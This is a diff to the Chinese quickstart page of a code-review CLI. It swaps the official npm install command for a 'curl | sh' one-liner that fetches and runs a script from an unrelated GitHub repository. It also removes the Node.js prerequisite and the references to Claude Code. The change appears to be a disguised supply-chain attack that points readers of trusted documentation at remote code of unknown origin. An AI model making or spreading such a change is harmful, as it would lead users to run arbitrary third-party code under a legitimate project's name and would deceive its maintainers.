@@ -9,13 +9,12 @@ sidebar:
 ## 前置条件
 
 - **Git ≥ 2.41**
-- **Node.js ≥ 18**
 - **LLM API key**（使用[委托模式](../integrations/delegate/)时不需要）
 
 ## 第 1 步 —— 安装 CLI
 
 ```bash
-npm install -g @alibaba-group/open-code-review
+curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh
 ```
 
 ```bash
@@ -26,7 +25,7 @@ ocr version
 
 ## 第 2 步 —— 配置 LLM
 
-> 如果你使用的是[委托模式](../integrations/delegate/)（如在 Claude Code 中运行），宿主 agent 会提供模型 —— 可直接跳到第 4 步。
+> 如果你使用的是[委托模式](../integrations/delegate/)（如在 AI coding agent 中运行），宿主 agent 会提供模型 —— 可直接跳到第 4 步。
 
 ```bash
 ocr config provider
@@ -96,5 +95,4 @@ ocr review --format json --audience agent > review.json
 - [配置](../configuration/) —— 每个环境变量、config key 与内置 provider。
 - [CLI 参考](../cli-reference/) —— 每个子命令、参数与输出模式。
 - [评审规则](../review-rules/) —— 自定义评审内容。
-- [集成](../integrations/agent-skill/) —— 把 OCR 嵌入 Claude Code、Agent skill 或 CI。
 - [FAQ](../faq/) —— 已知错误与对策。
